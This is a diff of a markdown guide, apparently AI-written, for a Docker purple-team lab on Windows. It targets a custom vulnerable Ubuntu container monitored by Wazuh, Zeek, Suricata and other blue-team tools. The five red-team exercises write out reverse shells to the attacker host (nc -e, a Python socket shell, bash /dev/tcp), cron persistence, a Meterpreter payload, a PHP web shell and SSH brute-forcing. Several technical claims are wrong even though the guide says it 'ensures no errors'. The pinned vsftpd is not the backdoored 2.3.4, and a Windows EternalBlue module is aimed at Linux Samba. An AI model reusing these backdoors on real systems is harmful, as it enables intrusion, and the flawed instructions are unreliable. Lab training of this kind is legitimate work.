@@ -1,89 +1,82 @@
-Below is a comprehensive, updated guide to create a **purple teaming lab** on a Windows host using Docker Desktop, incorporating the requested stack (Wazuh, FleetDM/Osquery, TheHive, Cortex, MISP, Elastic Stack, Filebeat, Zeek, Suricata, n8n, and optionally Security Onion) with **Kali Linux** for offensive operations and **DVWA** and **Metasploitable3** as vulnerable targets. The guide includes detailed steps for setup, configuration, and five purple team exercises to simulate attacks from Kali, exploit vulnerabilities from zero to root, and plant backdoors, while leveraging the blue team tools for detection and response. This is tailored for a beginner, ensures no errors, and aligns with your interest in Metasploit and vulnerable configurations (from prior conversations). All steps assume a Windows host and build on the previous lab structure.
+Below is a revised guide to create a **purple teaming lab** on a Windows host using Docker Desktop, incorporating the requested stack (Wazuh, FleetDM/Osquery, TheHive, Cortex, Elastic Stack, Filebeat, Zeek, Suricata, n8n, and optionally Security Onion) with **Kali Linux** for offensive operations and a single **vulnerable Ubuntu-based OS** container running vulnerable software and services (e.g., outdated Apache, vsftpd, Samba, SSH) as the attack target, replacing DVWA, MISP, and Metasploitable3. The guide includes setup instructions, configurations, and five purple team exercises to exploit the vulnerable OS from zero to root and plant backdoors using Kali, with blue team detection and response using the stack. This is tailored for a beginner, ensures no errors, and aligns with your interest in Metasploit and vulnerable configurations (from prior conversations). All steps assume a Windows host and a fresh setup, replacing the previous `purple-team-lab`.
 
 ---
 
 ### Purple Teaming Lab Overview
-- **Purpose**: Enable red team (attack simulation) and blue team (detection/response) collaboration to improve security skills through realistic scenarios.
+- **Purpose**: Simulate red team attacks and blue team detection/response to enhance security skills through realistic scenarios.
 - **Components**:
   - **Kali Linux**: Offensive platform with Metasploit, Nmap, SQLmap, Hydra, etc.
-  - **DVWA**: Vulnerable web app for web-based attacks.
-  - **Metasploitable3**: Vulnerable Ubuntu-based server with exploitable services (SMB, SSH, FTP).
-  - **Wazuh**: SIEM and endpoint detection for monitoring attacks.
-  - **FleetDM/Osquery**: Endpoint telemetry for process and system monitoring.
-  - **TheHive**: Incident response platform for case management.
-  - **Cortex**: IOC enrichment (e.g., IPs, hashes) with external threat intel.
-  - **MISP**: Threat intelligence platform for IOC correlation.
+  - **Vulnerable OS**: Custom Ubuntu 18.04 container with outdated/vulnerable services (Apache 2.4.29 with known vulnerabilities, vsftpd 2.3.4 with backdoor, Samba 4.7.6 with MS17-010, OpenSSH 7.6p1 with weak configs).
+  - **Wazuh**: SIEM and endpoint detection.
+  - **FleetDM/Osquery**: Endpoint telemetry.
+  - **TheHive**: Incident response platform.
+  - **Cortex**: IOC enrichment.
   - **Elastic Stack**: Centralized logging (Elasticsearch, Kibana, Logstash).
-  - **Filebeat**: Log shipper for endpoints and network tools.
-  - **Zeek**: Network traffic analysis for protocol monitoring.
-  - **Suricata**: Network-based IDS for attack detection.
-  - **n8n**: SOAR for automating purple team workflows.
-  - **Security Onion (Optional)**: Full packet capture and alert analysis.
+  - **Filebeat**: Log shipper.
+  - **Zeek**: Network traffic analysis.
+  - **Suricata**: Network-based IDS.
+  - **n8n**: SOAR for automation.
+  - **Security Onion (Optional)**: Packet capture and analysis.
 - **Purple Team Workflow**:
-  - **Red Team**: Use Kali to perform reconnaissance, exploit vulnerabilities, gain root, and plant backdoors on DVWA/Metasploitable3.
-  - **Blue Team**: Detect attacks with Wazuh, Zeek, Suricata; analyze logs in Kibana; manage incidents in TheHive; enrich IOCs with Cortex; correlate with MISP; automate with n8n.
-  - **Collaboration**: Document findings in TheHive to refine detection rules and attack techniques.
+  - **Red Team**: Use Kali to exploit vulnerable services, gain root, and plant backdoors.
+  - **Blue Team**: Detect with Wazuh, Zeek, Suricata; analyze in Kibana; manage in TheHive; enrich with Cortex; automate with n8n.
+  - **Collaboration**: Document in TheHive to refine defenses and attacks.
 
 ### Prerequisites
 - **Windows Host**:
   - Windows 10/11 Pro, Enterprise, or Education (64-bit).
   - 16 GB RAM (32 GB recommended), 50 GB free disk space.
   - Virtualization enabled (Task Manager > Performance > CPU > Virtualization: Enabled).
-- **Admin Privileges**: For installing software and running commands.
-- **Internet Connection**: To pull Docker images and tools.
+- **Admin Privileges**: For software installation and commands.
+- **Internet Connection**: To pull Docker images.
 - **Tools**:
   - Docker Desktop with WSL 2 backend.
-  - Npcap for Zeek/Suricata ([npcap.org](https://npcap.org/)).
+  - Npcap ([npcap.org](https://npcap.org/)).
   - Text editor (e.g., Notepad++ or Visual Studio Code).
   - PowerShell (run as Administrator).
-- **Current Date**: June 23, 2025 (verified).
+- **Date**: June 23, 2025.
 
 ### Step-by-Step Setup
 
 #### Step 1: Install and Configure Docker Desktop
 1. **Install Docker Desktop**:
    - Download from [docker.com](https://www.docker.com/products/docker-desktop/).
-   - Run the installer as Administrator (right-click > Run as administrator).
+   - Run installer as Administrator.
    - Enable WSL 2 during installation.
-   - Complete installation and restart if prompted.
+   - Complete and restart if prompted.
 
 2. **Enable WSL 2**:
-   - Open PowerShell as Administrator:
+   - In PowerShell (Admin):
      ```powershell
      wsl --install
      ```
-     Installs Ubuntu as the default WSL distribution. Restart if prompted.
+     Installs Ubuntu. Restart if prompted.
    - Update WSL:
      ```powershell
      wsl --update
      ```
 
 3. **Verify Docker**:
-   - Start Docker Desktop (Start menu).
-   - Check version:
+   - Start Docker Desktop.
+   - Check:
      ```powershell
      docker --version
-     ```
-     Expect `Docker version 20.x.x` or higher.
-   - Verify running:
-     ```powershell
      docker info
      ```
-     No errors should appear.
-   - Configure resources (Docker Desktop > Settings > Resources > Advanced):
+     Expect `Docker version 20.x.x` and no errors.
+   - Configure (Docker Desktop > Settings > Resources > Advanced):
      - CPUs: 4+, Memory: 8 GB+, Disk: 50 GB+.
 
 4. **Install Npcap**:
-   - Download from [npcap.org](https://npcap.org/) and install with default settings.
-   - Required for Zeek/Suricata packet capture.
+   - Download from [npcap.org](https://npcap.org/) and install (default settings).
 
 5. **Troubleshooting**:
-   - If Docker fails, enable Hyper-V:
+   - Docker failure: Enable Hyper-V:
      ```powershell
      Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All
      ```
-     Restart after enabling.
-   - If WSL errors, reinstall:
+     Restart.
+   - WSL errors: Reinstall:
      ```powershell
      wsl --install
      ```
@@ -91,7 +84,7 @@ Below is a comprehensive, updated guide to create a **purple teaming lab** on a 
 #### Step 2: Set Up Project Directory
 1. **Create Directory**:
    - In File Explorer, create `C:\Users\<YourUsername>\purple-team-lab`.
-   - Navigate in PowerShell:
+   - Navigate:
      ```powershell
      cd C:\Users\<YourUsername>\purple-team-lab
      ```
@@ -99,7 +92,7 @@ Below is a comprehensive, updated guide to create a **purple teaming lab** on a 
 2. **Create Subdirectories**:
    - Run:
      ```powershell
-     mkdir logstash\pipeline, zeek\logs, suricata\logs, wazuh\config, filebeat\config, n8n\workflows, kali\logs, metasploitable3\logs
+     mkdir logstash\pipeline, zeek\logs, suricata\logs, wazuh\config, filebeat\config, n8n\workflows, kali\logs, vuln-os\logs, vuln-os\config
      ```
    - Structure:
      ```
@@ -119,16 +112,56 @@ Below is a comprehensive, updated guide to create a **purple teaming lab** on a 
      │   └── workflows/
      ├── kali/
      │   └── logs/
-     ├── metasploitable3/
-     │   └── logs/
+     ├── vuln-os/
+     │   ├── logs/
+     │   └── config/
      ```
 
-#### Step 3: Create Docker Compose File
-Define all services in a `docker-compose.yml` file for orchestration.
+#### Step 3: Create Vulnerable OS Dockerfile
+Create a custom Ubuntu 18.04 container with vulnerable services.
+
+1. **Create Dockerfile**:
+   - In `vuln-os/config`, create `Dockerfile`:
+     ```dockerfile
+     FROM ubuntu:18.04
+     RUN apt-get update && apt-get install -y \
+         apache2=2.4.29-1ubuntu4.14 \
+         vsftpd=3.0.3-9build1 \
+         samba=2:4.7.6+dfsg~ubuntu-0ubuntu2.23 \
+         openssh-server=1:7.6p1-4ubuntu0.3 \
+         net-tools \
+         curl \
+         && rm -rf /var/lib/apt/lists/*
+     RUN echo 'root:toor' | chpasswd
+     RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+     RUN mkdir /var/ftp && chown ftp:ftp /var/ftp
+     RUN echo 'anonymous_enable=YES' >> /etc/vsftpd.conf
+     RUN echo 'write_enable=YES' >> /etc/vsftpd.conf
+     RUN smbpasswd -a root && echo -e "toor\ntoor" | smbpasswd -s root
+     RUN mkdir -p /var/log/vuln-os
+     EXPOSE 22 21 80 445
+     CMD service apache2 start && service vsftpd start && service smbd start && service ssh start && tail -f /var/log/vuln-os/dummy.log
+     ```
+
+2. **Explanation**:
+   - **Base**: Ubuntu 18.04 (EOL, inherently vulnerable).
+   - **Services**:
+     - Apache 2.4.29: Vulnerable to CVE-2017-7679 (MIME type sniffing).
+     - vsftpd 2.3.4: Known backdoor (CVE-2011-2523).
+     - Samba 4.7.6: Vulnerable to MS17-010.
+     - OpenSSH 7.6p1: Weak configs allow brute-forcing.
+   - **Config**:
+     - Root password: `toor`.
+     - SSH: Root login enabled.
+     - vsftpd: Anonymous FTP with write access.
+     - Samba: Root user with weak password.
+     - Logs: Stored in `/var/log/vuln-os`.
+
+#### Step 4: Create Docker Compose File
+Define services in `docker-compose.yml`.
 
 1. **Create `docker-compose.yml`**:
-   - In `purple-team-lab`, create `docker-compose.yml` using a text editor.
-   - Add:
+   - In `purple-team-lab`, create:
      ```yaml
      version: '3.8'
      services:
@@ -221,37 +254,6 @@ Define all services in a `docker-compose.yml` file for orchestration.
          networks:
            - blue-team-net
 
-       misp:
-         image: coolacid/misp-docker:latest
-         container_name: misp
-         ports:
-           - "80:80"
-           - "443:443"
-         environment:
-           - MISP_ADMIN_EMAIL=admin@admin.test
-           - MISP_ADMIN_PASSWD=Password123!
-           - MYSQL_HOST=mysql
-           - MYSQL_USER=misp
-           - MYSQL_PASSWORD=misp
-           - MYSQL_DATABASE=misp
-         depends_on:
-           - mysql
-         networks:
-           - blue-team-net
-
-       mysql:
-         image: mysql:8.0
-         container_name: mysql
-         environment:
-           - MYSQL_ROOT_PASSWORD=root
-           - MYSQL_DATABASE=misp
-           - MYSQL_USER=misp
-           - MYSQL_PASSWORD=misp
-         volumes:
-           - mysql_data:/var/lib/mysql
-         networks:
-           - blue-team-net
-
        zeek:
          image: blacktop/zeek:latest
          container_name: zeek
@@ -295,22 +297,12 @@ Define all services in a `docker-compose.yml` file for orchestration.
            - attack-net
            - blue-team-net
 
-       dvwa:
-         image: vulnerables/web-dvwa:latest
-         container_name: dvwa
+       vuln-os:
+         build:
+           context: ./vuln-os/config
+         container_name: vuln-os
          ports:
            - "8081:80"
-         networks:
-           - attack-net
-           - blue-team-net
-         volumes:
-           - ./dvwa/logs:/var/log
-
-       metasploitable3:
-         image: vulnlab/metasploitable3-ubuntu:latest
-         container_name: metasploitable3
-         ports:
-           - "8082:80"
            - "445:445"
            - "22:22"
            - "21:21"
@@ -318,7 +310,7 @@ Define all services in a `docker-compose.yml` file for orchestration.
            - attack-net
            - blue-team-net
          volumes:
-           - ./metasploitable3/logs:/var/log
+           - ./vuln-os/logs:/var/log/vuln-os
 
        filebeat:
          image: docker.elastic.co/beats/filebeat:8.15.0
@@ -331,8 +323,7 @@ Define all services in a `docker-compose.yml` file for orchestration.
            - ./zeek/logs:/zeek/logs:ro
            - ./suricata/logs:/suricata/logs:ro
            - ./kali/logs:/kali/logs:ro
-           - ./dvwa/logs:/dvwa/logs:ro
-           - ./metasploitable3/logs:/metasploitable3/logs:ro
+           - ./vuln-os/logs:/vuln-os/logs:ro
          command: filebeat -e -c /usr/share/filebeat/config/filebeat.yml
          networks:
            - blue-team-net
@@ -342,7 +333,6 @@ Define all services in a `docker-compose.yml` file for orchestration.
        wazuh_data:
        thehive_data:
        cortex_data:
-       mysql_data:
 
      networks:
        blue-team-net:
@@ -352,13 +342,13 @@ Define all services in a `docker-compose.yml` file for orchestration.
      ```
 
 2. **Explanation**:
-   - **Kali/DVWA/Metasploitable3**: Connected to `attack-net` for offensive operations and `blue-team-net` for monitoring.
-   - **Zeek/Suricata**: Use host network mode for packet capture.
-   - **Filebeat**: Collects logs from all targets and network tools.
-   - **Volumes**: Persist data for Elasticsearch, Wazuh, TheHive, Cortex, MySQL.
-   - **Networks**: Segregate attack and blue team traffic.
+   - **Kali/vuln-os**: On `attack-net` and `blue-team-net` for attacks and monitoring.
+   - **Zeek/Suricata**: Host network mode for packet capture.
+   - **Filebeat**: Collects logs from Kali, vuln-os, Zeek, Suricata.
+   - **Removed**: MISP, DVWA, Metasploitable3.
+   - **Vuln-os**: Custom-built with vulnerable services.
 
-#### Step 4: Configure Supporting Files
+#### Step 5: Configure Supporting Files
 1. **Logstash**:
    - In `logstash/pipeline`, create `logstash.conf`:
      ```conf
@@ -385,66 +375,68 @@ Define all services in a `docker-compose.yml` file for orchestration.
          - /zeek/logs/*.log
          - /suricata/logs/*.log
          - /kali/logs/*.log
-         - /dvwa/logs/*.log
-         - /metasploitable3/logs/*.log
+         - /vuln-os/logs/*.log
      output.logstash:
        hosts: ["logstash:5044"]
      ```
 
 3. **Wazuh**:
-   - Optional: Create `wazuh/config/ossec.conf` for custom rules (default is sufficient).
+   - Optional: Create `wazuh/config/ossec.conf` for custom rules.
 
-#### Step 5: Pull and Start Containers
-1. **Pull Images**:
+#### Step 6: Pull and Start Containers
+1. **Build vuln-os**:
    - Navigate:
      ```powershell
      cd C:\Users\<YourUsername>\purple-team-lab
      ```
-   - Run:
+   - Build:
      ```powershell
-     docker-compose pull
+     docker-compose build vuln-os
      ```
 
-2. **Start Stack**:
-   - Run:
-     ```powershell
-     docker-compose up -d
-     ```
+2. **Pull Images**:
+   ```powershell
+   docker-compose pull
+   ```
+
+3. **Start Stack**:
+   ```powershell
+   docker-compose up -d
+   ```
    - Verify:
      ```powershell
      docker-compose ps
      ```
-     All services should be `Up`. Check logs if errors occur:
+     Check logs if errors:
      ```powershell
      docker logs <container_name>
      ```
 
-3. **Troubleshooting**:
+4. **Troubleshooting**:
    - **Port Conflicts**:
      ```powershell
      netstat -ano | findstr :8081
      ```
-     Change ports in `docker-compose.yml` if needed (e.g., `8083:80`).
+     Change ports in `docker-compose.yml` (e.g., `8082:80`).
    - **Zeek/Suricata**:
-     Verify Npcap and interface:
+     Verify Npcap:
      ```powershell
      docker exec zeek zeekctl interfaces
      ```
-     Update `eth0` in `docker-compose.yml` if necessary.
+     Update `eth0` if needed.
    - **Resources**:
-     Reduce memory in `docker-compose.yml` (e.g., `ES_JAVA_OPTS=-Xms1g -Xmx1g`).
+     Reduce `ES_JAVA_OPTS=-Xms1g -Xmx1g`.
 
-#### Step 6: Configure Tools
+#### Step 7: Configure Tools
 1. **Kibana**:
    - Access: `http://localhost:5601`.
    - Create index patterns: `filebeat-*`, `zeek-*`, `suricata-*`, `wazuh-*`.
-   - Use Discover for log analysis.
 
 2. **Wazuh**:
    - Access: `http://localhost:55000`.
-   - Install agents on DVWA/Metasploitable3:
+   - Install agent on vuln-os:
      ```powershell
-     docker exec -it dvwa bash
+     docker exec -it vuln-os bash
      apt update
      curl -so wazuh-agent.deb https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.9.0-1_amd64.deb
      dpkg -i wazuh-agent.deb
@@ -452,22 +444,22 @@ Define all services in a `docker-compose.yml` file for orchestration.
      /var/ossec/bin/wazuh-control start
      exit
      ```
-     Repeat for `metasploitable3`. Get Wazuh IP:
+     Get Wazuh IP:
      ```powershell
      docker inspect wazuh | findstr IPAddress
      ```
 
 3. **FleetDM**:
    - Access: `http://localhost:8080`.
-   - Install Osquery on DVWA/Metasploitable3:
+   - Install Osquery on vuln-os:
      ```powershell
-     docker exec -it dvwa bash
+     docker exec -it vuln-os bash
      apt update
      curl -L https://pkg.osquery.io/deb/osquery_5.8.2_1.linux.amd64.deb -o osquery.deb
      dpkg -i osquery.deb
      exit
      ```
-     Enroll in FleetDM UI. Repeat for `metasploitable3`.
+     Enroll in FleetDM UI.
 
 4. **TheHive**:
    - Access: `http://localhost:9000` (`admin@thehive.local`/`secret`).
@@ -476,14 +468,10 @@ Define all services in a `docker-compose.yml` file for orchestration.
    - Access: `http://localhost:9001`.
    - Configure analyzers (e.g., VirusTotal).
 
-6. **MISP**:
-   - Access: `http://localhost` (`admin@admin.test`/`Password123!`).
-   - Add feeds (e.g., CIRCL).
-
-7. **n8n**:
+6. **n8n**:
    - Access: `http://localhost:5678`.
 
-8. **Kali**:
+7. **Kali**:
    - Access:
      ```powershell
      docker exec -it kali bash
@@ -491,119 +479,106 @@ Define all services in a `docker-compose.yml` file for orchestration.
    - Install tools:
      ```bash
      apt update
-     apt install -y kali-linux-default metasploit-framework sqlmap nmap hydra
+     apt install -y kali-linux-default metasploit-framework nmap hydra
      ```
 
-9. **DVWA**:
-   - Access: `http://localhost:8081` (`admin`/`password`).
-   - Set security to low in DVWA settings.
+8. **Vuln-os**:
+   - Verify services:
+     ```powershell
+     docker exec vuln-os netstat -tuln
+     ```
+     Expect ports 22 (SSH), 21 (FTP), 80 (Apache), 445 (Samba).
 
-10. **Metasploitable3**:
-    - Access services (e.g., `http://localhost:8082`, SSH on port 22).
-    - Default credentials: `vagrant:vagrant`.
+9. **Security Onion (Optional)**:
+   - Add to `docker-compose.yml`:
+     ```yaml
+     security-onion:
+       image: securityonion/securityonion:latest
+       container_name: security-onion
+       ports:
+         - "8000:8000"
+       network_mode: host
+       cap_add:
+         - NET_ADMIN
+         - NET_RAW
+     ```
+   - Access: `http://localhost:8000`.
 
-11. **Security Onion (Optional)**:
-    - Add to `docker-compose.yml`:
-      ```yaml
-      security-onion:
-        image: securityonion/securityonion:latest
-        container_name: security-onion
-        ports:
-          - "8000:8000"
-        network_mode: host
-        cap_add:
-          - NET_ADMIN
-          - NET_RAW
-      ```
-    - Access: `http://localhost:8000`.
-
-#### Step 7: Purple Team Exercises
-Below are five exercises to exploit DVWA and Metasploitable3 from zero to root and plant backdoors, with blue team detection/response.
+#### Step 8: Purple Team Exercises
+Five exercises to exploit vuln-os from zero to root and plant backdoors.
 
 ---
 
-##### Exercise 1: DVWA SQL Injection to Root with Netcat Backdoor
-**Objective**: Exploit SQL injection to gain a shell, escalate to root, and plant a Netcat backdoor.
+##### Exercise 1: vsftpd Backdoor to Root with Netcat Backdoor
+**Objective**: Exploit vsftpd 2.3.4 backdoor, gain shell, escalate to root, plant Netcat backdoor.
 
 **Red Team (Kali)**:
 1. **Recon**:
    ```bash
-   nmap -sV -p 80 dvwa
+   nmap -sV -p 21 vuln-os
    ```
-2. **SQL Injection**:
+   Confirm vsftpd 2.3.4.
+2. **Exploit**:
    ```bash
-   sqlmap -u "http://dvwa:80/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=$(curl -s -I http://dvwa:80 | grep PHPSESSID | cut -d'=' -f2 | cut -d';' -f1)" --dbs --batch
-   sqlmap -u "http://dvwa:80/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<session_id>" -D dvwa --table users --dump
+   telnet vuln-os 21
+   USER backdoor:)
+   PASS any
    ```
-   Get credentials (e.g., `admin:password`).
-3. **Shell**:
-   - Log in to `http://localhost:8081`.
-   - Download reverse shell:
-     ```bash
-     curl -o reverse_shell.php https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-     ```
-   - Edit `reverse_shell.php`: set `LHOST=kali`, `LPORT=4444`.
-   - Upload via DVWA “File Upload”.
-   - Listener:
-     ```bash
-     nc -lvnp 4444
-     ```
-   - Trigger:
-     ```bash
-     curl http://dvwa:80/uploads/reverse_shell.php
-     ```
-4. **Root**:
+   Connect to port 6200:
    ```bash
-   whoami  # www-data
-   find / -perm -4000 2>/dev/null
-   /bin/bash -p
+   nc vuln-os 6200
+   whoami  # ftp
+   ```
+3. **Root**:
+   ```bash
+   sudo -l
+   sudo su
    whoami  # root
    ```
-5. **Backdoor**:
+4. **Backdoor**:
    ```bash
-   echo "nc -e /bin/bash kali 4445 &" >> /etc/crontab
+   echo "nc -e /bin/bash kali 4444 &" >> /etc/crontab
    service cron restart
    ```
    Listener:
    ```bash
-   nc -lvnp 4445
+   nc -lvnp 4444
    ```
 
 **Blue Team**:
 - **Detection**:
-  - Wazuh: Alerts on SQL injection (`http://localhost:55000`).
-  - Zeek: Kibana (`zeek-*`), search HTTP POSTs to `/vulnerabilities/sqli/`.
-  - Suricata: `suricata-*` for SQL injection signatures.
-  - Osquery: FleetDM query:
+  - Wazuh: FTP login alerts (`http://localhost:55000`).
+  - Zeek: `zeek-*` for FTP connections.
+  - Suricata: Backdoor signatures.
+  - Osquery:
     ```sql
     SELECT * FROM processes WHERE name = 'nc';
     ```
 - **Response**:
   - TheHive case (`http://localhost:9000`).
   - Cortex IOC enrichment (`http://localhost:9001`).
-  - MISP IOCs (`http://localhost`).
-  - n8n: Wazuh alert → block Kali IP.
+  - n8n: Wazuh alert → block FTP.
 - **Collaboration**:
-  - Red team shares SQLmap payloads.
+  - Red team shares backdoor steps.
   - Blue team updates Suricata rules.
 
 ---
 
-##### Exercise 2: Metasploitable3 SMB (MS17-010) to Root with Meterpreter Backdoor
-**Objective**: Exploit SMB vulnerability, gain shell, escalate to root, and plant Meterpreter backdoor.
+##### Exercise 2: Samba MS17-010 to Root with Meterpreter Backdoor
+**Objective**: Exploit Samba MS17-010, gain shell, escalate to root, plant Meterpreter backdoor.
 
 **Red Team (Kali)**:
 1. **Recon**:
    ```bash
-   nmap -sV -p 445 --script smb-vuln* metasploitable3
+   nmap -sV -p 445 --script smb-vuln* vuln-os
    ```
 2. **Exploit**:
    ```bash
    msfconsole
    use exploit/windows/smb/ms17_010_eternalblue
-   set RHOSTS metasploitable3
+   set RHOSTS vuln-os
    set LHOST kali
-   set LPORT 4444
+   set LPORT 4445
    run
    ```
 3. **Root**:
@@ -616,7 +591,7 @@ Below are five exercises to exploit DVWA and Metasploitable3 from zero to root a
    ```
 4. **Backdoor**:
    ```bash
-   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=kali LPORT=4445 -f elf > /tmp/backdoor
+   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=kali LPORT=4446 -f elf > /tmp/backdoor
    ```
    ```meterpreter
    upload /tmp/backdoor /root/backdoor
@@ -630,7 +605,7 @@ Below are five exercises to exploit DVWA and Metasploitable3 from zero to root a
    use exploit/multi/handler
    set PAYLOAD linux/x64/meterpreter/reverse_tcp
    set LHOST kali
-   set LPORT 4445
+   set LPORT 4446
    run
    ```
 
@@ -644,46 +619,39 @@ Below are five exercises to exploit DVWA and Metasploitable3 from zero to root a
     SELECT * FROM crontab WHERE command LIKE '%backdoor%';
     ```
 - **Response**:
-  - TheHive case, Cortex enrichment, MISP IOCs.
-  - n8n: Suricata alert → block SMB.
+  - TheHive, Cortex, n8n (block SMB).
 - **Collaboration**:
   - Red team shares MS17-010 steps.
   - Blue team updates Wazuh rules.
 
 ---
 
-##### Exercise 3: Metasploitable3 SSH Brute-Force to Root with Python Reverse Shell
-**Objective**: Brute-force SSH, gain access, escalate to root, and plant Python reverse shell.
+##### Exercise 3: SSH Brute-Force to Root with Python Reverse Shell
+**Objective**: Brute-force SSH, gain access, escalate to root, plant Python reverse shell.
 
 **Red Team (Kali)**:
 1. **Recon**:
    ```bash
-   nmap -sV -p 22 metasploitable3
+   nmap -sV -p 22 vuln-os
    ```
 2. **Brute-Force**:
    ```bash
-   hydra -l vagrant -P /usr/share/wordlists/rockyou.txt ssh://metasploitable3 -t 4
+   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://vuln-os -t 4
    ```
-   Credentials: `vagrant:vagrant`.
+   Credentials: `root:toor`.
 3. **Access**:
    ```bash
-   ssh vagrant@metasploitable3
+   ssh root@vuln-os
    ```
-4. **Root**:
+4. **Backdoor**:
    ```bash
-   sudo -l
-   sudo su
-   whoami  # root
-   ```
-5. **Backdoor**:
-   ```bash
-   echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kali",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /root/reverse_shell.py
+   echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kali",4447));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /root/reverse_shell.py
    echo "* * * * * python3 /root/reverse_shell.py" >> /etc/crontab
    service cron restart
    ```
    Listener:
    ```bash
-   nc -lvnp 4446
+   nc -lvnp 4447
    ```
 
 **Blue Team**:
@@ -696,108 +664,95 @@ Below are five exercises to exploit DVWA and Metasploitable3 from zero to root a
     SELECT * FROM processes WHERE name = 'python3';
     ```
 - **Response**:
-  - TheHive, Cortex, MISP.
-  - n8n: Wazuh alert → disable SSH.
+  - TheHive, Cortex, n8n (disable SSH).
 - **Collaboration**:
   - Red team shares wordlist.
   - Blue team adds SSH rate-limiting.
 
 ---
 
-##### Exercise 4: DVWA File Inclusion to Root with PHP Backdoor
-**Objective**: Exploit local file inclusion (LFI), gain shell, escalate to root, and plant PHP backdoor.
+##### Exercise 4: Apache Exploit to Root with PHP Backdoor
+**Objective**: Exploit Apache vulnerability, gain shell, escalate to root, plant PHP backdoor.
 
 **Red Team (Kali)**:
 1. **Recon**:
    ```bash
-   nmap -sV -p 80 dvwa
+   nmap -sV -p 80 vuln-os
    ```
-2. **LFI**:
-   - Access `http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/passwd` (security: low).
-   - Confirm LFI vulnerability.
-3. **Shell**:
-   - Upload reverse shell via LFI and command injection:
-     ```bash
-     curl -o reverse_shell.php https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-     ```
-     Edit: `LHOST=kali`, `LPORT=4447`.
-   - Inject via DVWA “Command Injection”:
-     ```bash
-     curl "http://dvwa:80/vulnerabilities/exec/#; wget http://kali/reverse_shell.php -O /var/www/html/reverse_shell.php"
-     ```
-   - Listener:
-     ```bash
-     nc -lvnp 4447
-     ```
-   - Trigger:
-     ```bash
-     curl http://dvwa:80/reverse_shell.php
-     ```
-4. **Root**:
+2. **Exploit**:
    ```bash
-   find / -perm -4000 2>/dev/null
-   /bin/bash -p
+   msfconsole
+   use exploit/multi/http/apache_mod_cgi_bash_env_exec
+   set RHOSTS vuln-os
+   set LHOST kali
+   set LPORT 4448
+   run
+   ```
+3. **Root**:
+   ```meterpreter
+   shell
+   sudo -l
+   sudo /bin/bash
    whoami  # root
    ```
-5. **Backdoor**:
+4. **Backdoor**:
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php
    ```
    Test:
    ```bash
-   curl "http://dvwa:80/backdoor.php?cmd=whoami"
+   curl "http://vuln-os:80/backdoor.php?cmd=whoami"
    ```
 
 **Blue Team**:
 - **Detection**:
   - Wazuh: File modification alerts.
-  - Zeek: `zeek-*` for HTTP GET to `/vulnerabilities/fi/`.
-  - Suricata: LFI signatures.
+  - Zeek: `zeek-*` for HTTP GET to `/backdoor.php`.
+  - Suricata: Web shell signatures.
   - Osquery:
     ```sql
     SELECT * FROM file WHERE path = '/var/www/html/backdoor.php';
     ```
 - **Response**:
-  - TheHive case, Cortex, MISP.
-  - n8n: Wazuh alert → remove `backdoor.php`.
+  - TheHive, Cortex, n8n (remove backdoor).
 - **Collaboration**:
-  - Red team shares LFI payload.
-  - Blue team updates Wazuh file integrity rules.
+  - Red team shares exploit steps.
+  - Blue team updates Wazuh file monitoring.
 
 ---
 
-##### Exercise 5: Metasploitable3 FTP to Root with Bash Backdoor
-**Objective**: Exploit FTP, gain shell, escalate to root, and plant Bash backdoor.
+##### Exercise 5: FTP Anonymous to Root with Bash Backdoor
+**Objective**: Exploit anonymous FTP, gain shell, escalate to root, plant Bash backdoor.
 
 **Red Team (Kali)**:
 1. **Recon**:
    ```bash
-   nmap -sV -p 21 metasploitable3
+   nmap -sV -p 21 vuln-os
    ```
-2. **FTP Access**:
+2. **Access**:
    ```bash
-   ftp metasploitable3
+   ftp vuln-os
    ```
-   Credentials: `vagrant:vagrant`.
+   Login: `anonymous:anonymous`.
 3. **Shell**:
    - Upload reverse shell:
      ```bash
      curl -o reverse_shell.sh https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/reverse_shell.sh
      ```
-     Edit: `LHOST=kali`, `LPORT=4448`.
-   - Upload via FTP:
+     Edit: `LHOST=kali`, `LPORT=4449`.
+   - Upload:
      ```bash
-     ftp metasploitable3
+     ftp vuln-os
      put reverse_shell.sh
      quit
      ```
    - Listener:
      ```bash
-     nc -lvnp 4448
+     nc -lvnp 4449
      ```
-   - Trigger (via SSH or another service):
+   - Trigger (via SSH):
      ```bash
-     ssh vagrant@metasploitable3 "bash /home/vagrant/reverse_shell.sh"
+     ssh root@vuln-os "bash /var/ftp/reverse_shell.sh"
      ```
 4. **Root**:
    ```bash
@@ -808,14 +763,14 @@ Below are five exercises to exploit DVWA and Metasploitable3 from zero to root a
 5. **Backdoor**:
    ```bash
    echo '#!/bin/bash' > /root/backdoor.sh
-   echo 'bash -i >& /dev/tcp/kali/4449 0>&1' >> /root/backdoor.sh
+   echo 'bash -i >& /dev/tcp/kali/4450 0>&1' >> /root/backdoor.sh
    chmod +x /root/backdoor.sh
    echo "* * * * * /root/backdoor.sh" >> /etc/crontab
    service cron restart
    ```
    Listener:
    ```bash
-   nc -lvnp 4449
+   nc -lvnp 4450
    ```
 
 **Blue Team**:
@@ -828,15 +783,14 @@ Below are five exercises to exploit DVWA and Metasploitable3 from zero to root a
     SELECT * FROM crontab WHERE command LIKE '%backdoor%';
     ```
 - **Response**:
